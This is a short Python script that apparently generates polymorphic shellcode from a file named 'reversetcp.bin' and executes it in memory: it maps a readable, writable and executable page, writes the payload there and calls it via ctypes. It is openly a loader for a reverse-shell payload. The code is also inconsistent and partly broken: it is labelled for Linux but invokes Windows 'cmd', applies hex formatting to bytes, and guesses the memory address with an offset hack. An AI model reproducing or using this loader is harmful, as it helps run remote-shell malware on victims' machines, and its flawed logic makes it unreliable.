import ctypes
import mmap
import subprocess

# RUN SHELLCODE LINUX

shellcode = str(subprocess.Popen(["cmd", "/C", "polymshell.exe ./reversetcp.bin"], stdout=subprocess.PIPE).communicate()[0])
print(shellcode)
while(shellcode == "N"):
    shellcode = str(subprocess.Popen(["cmd", "/C", "polymshell.exe ./reversetcp.bin"], stdout=subprocess.PIPE).communicate()[0])

shellcode = shellcode.encode()
print("%02X" % shellcode)

def runshell():
# Allocate an executable memory and write shellcode to it
    mem = mmap.mmap(
        -1,
        mmap.PAGESIZE,
        mmap.MAP_SHARED,
        mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC,
    )
    mem.write(shellcode)

# Get actuall mmap address (I don't know the proper way to get the address sorry...)
# Assuming x64
    addr = int.from_bytes(ctypes.string_at(id(mem) + 16, 8), "little")
    print(hex(addr))

# Create the function
    functype = ctypes.CFUNCTYPE(ctypes.c_void_p)
    fn = functype(addr)

# Run shellcode
    fn()
    
if __name__ == "__main__":
    runshell()
    